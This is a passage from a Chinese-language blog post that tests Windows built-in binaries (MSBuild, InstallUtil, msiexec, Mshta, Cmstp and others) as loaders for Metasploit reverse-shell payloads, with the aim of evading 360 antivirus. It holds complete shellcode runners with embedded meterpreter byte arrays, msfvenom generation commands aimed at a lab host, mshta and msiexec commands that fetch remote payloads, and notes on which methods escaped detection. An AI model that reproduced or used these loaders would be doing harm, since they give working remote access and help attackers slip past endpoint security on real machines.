class="attr">Name</span>=<span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ClassExample</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">UsingTask</span></span></span><br><span class="line"><span class="tag">    <span class="attr">TaskName</span>=<span class="string">&quot;ClassExample&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">TaskFactory</span>=<span class="string">&quot;CodeTaskFactory&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">AssemblyFile</span>=<span class="string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Task</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">      <span class="tag">&lt;<span class="name">Code</span> <span class="attr">Type</span>=<span class="string">&quot;Class&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;cs&quot;</span>&gt;</span></span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT = 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          </span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode = new byte[354] &#123;</span><br><span class="line">0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,</span><br><span class="line">0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x31,0xff,0x0f,0xb7,0x4a,0x26,</span><br><span class="line">0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,</span><br><span class="line">0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,</span><br><span class="line">0xc0,0x57,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x01,0xd3,0x8b,0x48,0x18,0x50,</span><br><span class="line">0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,</span><br><span class="line">0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,</span><br><span class="line">0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,</span><br><span class="line">0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,</span><br><span class="line">0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,</span><br><span class="line">0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,</span><br><span class="line">0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,</span><br><span class="line">0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xdd,0x80,0x68,0x02,</span><br><span class="line">0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,</span><br><span class="line">0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,</span><br><span class="line">0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,</span><br><span class="line">0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,</span><br><span class="line">0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,</span><br><span class="line">0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,</span><br><span class="line">0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,</span><br><span class="line">0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,</span><br><span class="line">0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,</span><br><span class="line">0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,</span><br><span class="line">0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread = IntPtr.Zero;</span><br><span class="line">              UInt32 threadId = 0;</span><br><span class="line">              IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">Code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">UsingTask</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222162020816.png" alt="image-20220222162020816"></p>
<p>msf上线</p>
<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222161956622.png" alt="image-20220222161956622"></p>
<p>360动静态未查杀</p>
<h2 id="misexec-exe"><a href="#misexec-exe" class="headerlink" title="misexec.exe"></a>misexec.exe</h2><p>当Windows操作系统安装了Windows Installer引擎，⽽MSI软件包使⽤该引擎来 安装应⽤程序，解释包和安装产品的可执⾏程序</p>
<h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://ip/shell.msi</span><br></pre></td></tr></table></figure>

<p>经测试msf自生成以及一些工具生成的msi文件免杀效果都一般</p>
<h2 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h2><p>InstallUtil.exe可以⽤于安装由.NET开发的所有应⽤安装程序</p>
<h3 id="CSC-InstallUtil执行shellcode"><a href="#CSC-InstallUtil执行shellcode" class="headerlink" title="CSC+InstallUtil执行shellcode"></a>CSC+InstallUtil执行shellcode</h3><p>msfvenom生成C# shellcode 编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.221.128 lport=4444 -f csharp</span><br></pre></td></tr></table></figure>

<p>InstallUtil-Shellcode.cs （Shellcode替换下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Configuration.Install;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">Author: Casey Smith, Twitter: @subTee</span><br><span class="line">License: BSD 3-Clause</span><br><span class="line">Step One:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:exeshell.exe Shellcode.cs</span><br><span class="line">Step Two:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe</span><br><span class="line">(Or)</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe</span><br><span class="line">	The gist of this one is we can exhibit one behaviour if the application is launched via normal method, Main().</span><br><span class="line">	Yet, when the Assembly is launched via InstallUtil.exe, it is loaded via Reflection and circumvents many whitelist controls.</span><br><span class="line">	We believe the root issue here is:</span><br><span class="line">	</span><br><span class="line">	The root issue here with Assembly.Load() is that at the point at which execute operations are detected </span><br><span class="line">	(CreateFileMapping-&gt;NtCreateSection), only read-only access to the section is requested, so it is not processed as an execute operation.  </span><br><span class="line">	Later, execute access is requested in the file mapping (MapViewOfFile-&gt;NtMapViewOfSection), </span><br><span class="line">	which results in the image being mapped as EXECUTE_WRITECOPY and subsequently allows unchecked execute access.</span><br><span class="line">	</span><br><span class="line">	The concern is this technique can circumvent many security products, so I wanted to make you aware and get any feedback.</span><br><span class="line">	Its not really an exploit, but just a creative way to launch an exe/assembly.</span><br><span class="line">*/</span><br><span class="line"> </span><br><span class="line">//root@infosec:~# msfvenom --payload windows/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f csharp &gt; pentestShellCode.txt</span><br><span class="line"></span><br><span class="line">	public class Program</span><br><span class="line">	&#123;</span><br><span class="line">		public static void Main()</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;Hello From Main...I Don&#x27;t Do Anything&quot;);</span><br><span class="line">			//Add any behaviour here to throw off sandbox execution/analysts :)</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	[System.ComponentModel.RunInstaller(true)]</span><br><span class="line">	public class Sample : System.Configuration.Install.Installer</span><br><span class="line">	&#123;</span><br><span class="line">	    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.</span><br><span class="line">	    public override void Uninstall(System.Collections.IDictionary savedState)</span><br><span class="line">	    &#123;</span><br><span class="line">		</span><br><span class="line">		Shellcode.Exec();</span><br><span class="line">	    	</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	public class Shellcode</span><br><span class="line">	&#123;</span><br><span class="line">			public static void Exec()</span><br><span class="line">			&#123;</span><br><span class="line">				// native function&#x27;s compiled code</span><br><span class="line">				// generated with metasploit</span><br><span class="line">                byte[] shellcode = new byte[516] &#123;</span><br><span class="line">0xbb,0xb5,0x9f,0x2d,0x3f,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,</span><br><span class="line">0x7b,0x31,0x5d,0x13,0x03,0x5d,0x13,0x83,0xc5,0xb1,0x7d,0xd8,0xe2,0x78,0x3b,</span><br><span class="line">0xf6,0x54,0x9d,0x5a,0x20,0x12,0x45,0x57,0x8d,0xf2,0x4c,0x26,0x46,0x34,0x19,</span><br><span class="line">0x50,0x24,0xf1,0xa1,0x61,0x7d,0xeb,0x9e,0xd9,0xdd,0xdb,0x71,0x74,0x3a,0x15,</span><br><span class="line">0x7d,0x07,0x5c,0x7e,0x27,0x3e,0x0e,0xa3,0xc4,0x73,0x6e,0xdf,0xac,0xbc,0x59,</span><br><span class="line">0x24,0x5b,0xd6,0x27,0x73,0xab,0x68,0xfd,0x45,0xb3,0xb2,0xe3,0x87,0xde,0x08,</span><br><span class="line">0x05,0xdc,0xbe,0xf5,0x0c,0xc0,0xca,0xe5,0x52,0x1a,0x9f,0x5b,0xb9,0x95,0x73,</span><br><span class="line">0x06,0x8e,0x47,0x44,0xd4,0x2d,0xd1,0xaa,0x34,0x61,0x83,0xc1,0xec,0xd4,0xde,</span><br><span class="line">0x96,0x42,0xed,0x83,0xc5,0xe0,0xf1,0x9d,0xf3,0x4f,0x38,0x7a,0x18,0xda,0x97,</span><br><span class="line">0x81,0x1b,0xf8,0xdf,0xf0,0x2d,0x5f,0x22,0xaa,0x35,0x2c,0x04,0xda,0xe5,0x33,</span><br><span class="line">0x0e,0x3e,0x23,0x8c,0x74,0xbd,0x09,0xc5,0xe4,0x9a,0x59,0x85,0x62,0x39,0x46,</span><br><span class="line">0x4c,0x92,0x74,0xa1,0x75,0x3e,0x67,0xa6,0xe5,0xf6,0x66,0x4f,0x4d,0x61,0xa2,</span><br><span class="line">0xd8,0x27,0xca,0xd6,0x08,0x5b,0x68,0x91,0x98,0x33,0xb8,0xfa,0x8d,0xd8,0x0d,</span><br><span class="line">0xf9,0xef,0x50,0xca,0xf1,0xae,0x5a,0x82,0xba,0xec,0xca,0x17,0xb2,0x5e,0x01,</span><br><span class="line">0xa6,0x8a,0x53,0xda,0x2a,0x4a,0x53,0x80,0xf5,0x2d,0x86,0x7c,0x02,0x71,0xa9,</span><br><span class="line">0x7d,0x91,0x6e,0x75,0xc7,0x2a,0x48,0xfd,0x03,0xe8,0x96,0x51,0x0b,0xfc,0x94,</span><br><span class="line">0xf7,0xab,0x6a,0x8f,0x23,0xc2,0xf5,0xc6,0xaf,0x1b,0x5d,0x82,0x94,0x51,0x44,</span><br><span class="line">0xa8,0xa8,0xea,0x72,0xd1,0xea,0xd2,0xde,0xb6,0x35,0x6b,0xdf,0xa9,0xeb,0x65,</span><br><span class="line">0x67,0xdf,0x64,0xf4,0xb2,0xeb,0xd4,0x32,0x65,0xe3,0x37,0x16,0xf8,0x8d,0x66,</span><br><span class="line">0x9f,0xdf,0x59,0xa8,0xce,0xbb,0x19,0x5b,0x55,0x8a,0xa0,0xb4,0xc5,0x4c,0x77,</span><br><span class="line">0xd9,0xca,0xf3,0x52,0x8a,0x9b,0x82,0x7b,0x19,0xf4,0x22,0xe8,0x04,0xba,0x8e,</span><br><span class="line">0xdb,0xfb,0x21,0xcf,0x2d,0x1c,0xb9,0xed,0xff,0x83,0x76,0xa7,0x12,0x77,0xec,</span><br><span class="line">0xbb,0x76,0x75,0xe9,0xec,0xd7,0xe1,0x68,0x2a,0x72,0x69,0xbb,0x6d,0xde,0x6f,</span><br><span class="line">0xbf,0x9c,0x49,0x43,0xef,0x7e,0xf7,0xfd,0x42,0x55,0x40,0xa1,0x3e,0xa9,0x81,</span><br><span class="line">0xce,0xf8,0xa3,0x21,0x35,0x85,0x4a,0x18,0x86,0xd0,0xa3,0x89,0x28,0x53,0xeb,</span><br><span class="line">0xa0,0x54,0x79,0x54,0x6b,0xd8,0xd1,0xff,0xe8,0x09,0x70,0xb2,0x9e,0x4e,0xd3,</span><br><span class="line">0x53,0x41,0xf3,0x90,0xd3,0x71,0xcb,0x70,0xa7,0x68,0x9c,0xd5,0x29,0xcb,0xcd,</span><br><span class="line">0x7f,0xc3,0xd1,0xd3,0x98,0x3b,0xa6,0x16,0x3b,0xc9,0x08,0xdd,0x19,0x48,0xf7,</span><br><span class="line">0xb8,0x2a,0x75,0x2a,0x9c,0x71,0x28,0x2d,0x53,0xfa,0xc3,0x55,0xa6,0x9b,0x22,</span><br><span class="line">0xe1,0xd4,0x06,0xbd,0x44,0xfc,0x39,0x01,0xf0,0x09,0x09,0xbf,0xe0,0x60,0xa7,</span><br><span class="line">0x2e,0xc1,0xf9,0x78,0x1f,0xfc,0xb2,0x3a,0xc5,0xe3,0x96,0xc1,0xf3,0x21,0x4c,</span><br><span class="line">0xb0,0xb0,0x64,0x24,0x6e,0x42,0x94,0x9e,0x0b,0x67,0xb1,0x2d,0x7c,0x44,0xea,</span><br><span class="line">0x0b,0x6a,0xad,0x35,0x67,0x23,0x12,0xcd,0xd8,0x5b,0x12,0xc5,0xf1,0xc7,0x15,</span><br><span class="line">0x51,0x14,0x85,0x32,0xe7,0x96,0xc6,0x92,0xb4,0x5e,0x60,0x8d,0x5d,0x7b,0x6f,</span><br><span class="line">0xb5,0x80,0x9e,0x9b,0x75,0x11 &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	 </span><br><span class="line">				UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,</span><br><span class="line">									MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">				Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);</span><br><span class="line">				IntPtr hThread = IntPtr.Zero;</span><br><span class="line">				UInt32 threadId = 0;</span><br><span class="line">				// prepare data</span><br><span class="line">	 </span><br><span class="line">	 </span><br><span class="line">				IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">	 </span><br><span class="line">				// execute native code</span><br><span class="line">	 </span><br><span class="line">				hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">				WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">	 </span><br><span class="line">		  &#125;</span><br><span class="line">	 </span><br><span class="line">			private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">	 </span><br><span class="line">			private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line">	</span><br><span class="line">			[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line"> </span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool VirtualFree(IntPtr lpAddress,</span><br><span class="line">                              UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line"> </span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line"> </span><br><span class="line">          UInt32 lpThreadAttributes,</span><br><span class="line">          UInt32 dwStackSize,</span><br><span class="line">          UInt32 lpStartAddress,</span><br><span class="line">          IntPtr param,</span><br><span class="line">          UInt32 dwCreationFlags,</span><br><span class="line">          ref UInt32 lpThreadId</span><br><span class="line"> </span><br><span class="line">          );</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line"> </span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line"> </span><br><span class="line">          IntPtr hHandle,</span><br><span class="line">          UInt32 dwMilliseconds</span><br><span class="line">          );</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr GetModuleHandle(</span><br><span class="line"> </span><br><span class="line">          string moduleName</span><br><span class="line"> </span><br><span class="line">          );</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetProcAddress(</span><br><span class="line"> </span><br><span class="line">          IntPtr hModule,</span><br><span class="line">          string procName</span><br><span class="line"> </span><br><span class="line">          );</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 LoadLibrary(</span><br><span class="line"> </span><br><span class="line">          string lpFileName</span><br><span class="line"> </span><br><span class="line">          );</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetLastError();</span><br><span class="line">			</span><br><span class="line">	 </span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p><code>CSC.exe</code>编译<code>InstallUtil-Shellcode.cs</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\test\shell.exe C:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>

<p>用<code>InstallUtil.exe</code>执行<code>shell.exe</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\test\shell.exe</span><br></pre></td></tr></table></figure>

<p>执行后360安全卫士有行为检测预警，允许则msf可上线</p>
<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222165327639.png" alt="image-20220222165327639"></p>
<p>360杀毒静态可查杀</p>
<h2 id="Mshta-exe"><a href="#Mshta-exe" class="headerlink" title="Mshta.exe"></a>Mshta.exe</h2><p>用于执行<code>.hta</code>文件，但是在工具篇中hta的免杀效果比较一般</p>
<p>msf直接生成的hta用Mshta.exe还是会被查杀</p>
<h3 id="CACTUSTORCH"><a href="#CACTUSTORCH" class="headerlink" title="CACTUSTORCH"></a>CACTUSTORCH</h3><p>在<code>CACTUSTORCH.hta</code>的<code>binary</code>处，选择要注入的exe</p>
<p>生成32位shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -f raw -o payload.bin</span><br></pre></td></tr></table></figure>

<p>base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload.bin | base64 -w 0</span><br></pre></td></tr></table></figure>

<p>把编码后的code复制到<code>CACTUSTORCH.hta</code>的<code>code</code>处</p>
<p>Kali起一个服务，Win7执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http://192.168.221.128/CACTUSTORCH.hta</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222173052309.png" alt="image-20220222173052309"></p>
<p>360没有反应但是一直msf一直没上线，注入程序calc、rundll32都试过</p>
<p>拖到本地执行直接报毒了，Mshta.exe没有一个免杀成功的醉了</p>
<h2 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h2><p> 可执行32位的DLL文件，以命令行的方式调用动态链接库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rundll32.exe DLLname,Functionname</span><br></pre></td></tr></table></figure>

<p>Rundll32.exe加载payload的免杀效果依赖于payload所做的免杀，且免杀效果一般通过行为检测来判断</p>
<p>MSFVenom和msf中SMB DElivery模块都可以生成恶意dll文件，但是执行都过不了行为检测</p>
<h2 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h2><p>Regsvr32是⼀个命令⾏实⽤程序，⽤于注册和取消注册OLE控件，例如Windows注册表中的DLL和ActiveX控件，以命令⾏⽅式运⾏</p>
<p>加载payload的原理就是通过JScript代码执行不同的命令，测试下来都过不了行为检测</p>
<h2 id="Cmstp-exe"><a href="#Cmstp-exe" class="headerlink" title="Cmstp.exe"></a>Cmstp.exe</h2><p>⽤于安装连接管理器服务配置⽂件的命令⾏程序。CMSTP.exe接受安装信息⽂件（INF）作为参数，并安装⽤于远程访问连接的服务配置⽂件。</p>
<h3 id="执行本地dll文件"><a href="#执行本地dll文件" class="headerlink" title="执行本地dll文件"></a>执行本地dll文件</h3><p>msfvenom生成DLL文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -f dll -o test.dll</span><br></pre></td></tr></table></figure>

<p>cmstp.inf</p>
